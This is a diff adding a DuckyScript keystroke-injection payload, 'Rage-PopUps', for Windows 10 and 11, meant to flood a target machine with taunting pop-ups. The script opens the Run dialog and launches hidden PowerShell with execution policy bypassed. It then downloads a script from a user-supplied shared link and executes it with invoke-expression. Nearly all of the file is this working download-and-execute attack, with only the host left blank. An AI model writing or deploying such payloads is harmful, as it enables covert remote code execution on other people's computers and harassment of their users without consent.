@@ -1,0 +1,16 @@
+REM     Title: Rage-PopUps
+REM
+REM     Author: I am Jakoby
+REM
+REM     Description: This payload is meant to make a never ending supply of taunting pop-ups. See Rage-PopUps.ps1 for more details
+REM
+REM     Target: Windows 10, 11
+REM
+REM     Remeber to replace the link with your link for the intended file to download
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+DELAY 500
+ENTER
